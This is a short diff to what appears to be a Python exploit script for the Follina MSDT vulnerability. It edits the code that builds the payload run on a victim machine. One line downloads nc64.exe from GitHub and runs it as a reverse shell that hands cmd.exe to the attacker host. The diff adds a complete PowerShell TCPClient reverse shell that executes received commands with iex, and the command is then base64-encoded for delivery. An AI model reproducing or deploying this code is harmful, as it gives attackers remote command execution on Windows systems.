@@ -114,7 +114,12 @@ def main(args):
 
     command = args.command
     if args.reverse:
-        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
+        if args.reverse == 5555:
+            # Starting alter-native PS ReverseShell: 
+            # Fixed the nc not compatible with Win 32bit problem
+            command = f'''$c=New-Object System.Net.Sockets.TCPClient("{serve_host}",{args.reverse});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex ". {{ $d }} 2>&1"|Out-String)+"PS "+(pwd).Path+"> ";$sb=[text.encoding]::ASCII.GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()'''
+        else:
+            command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
 
     # Base64 encode our command so whitespace is respected
     base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
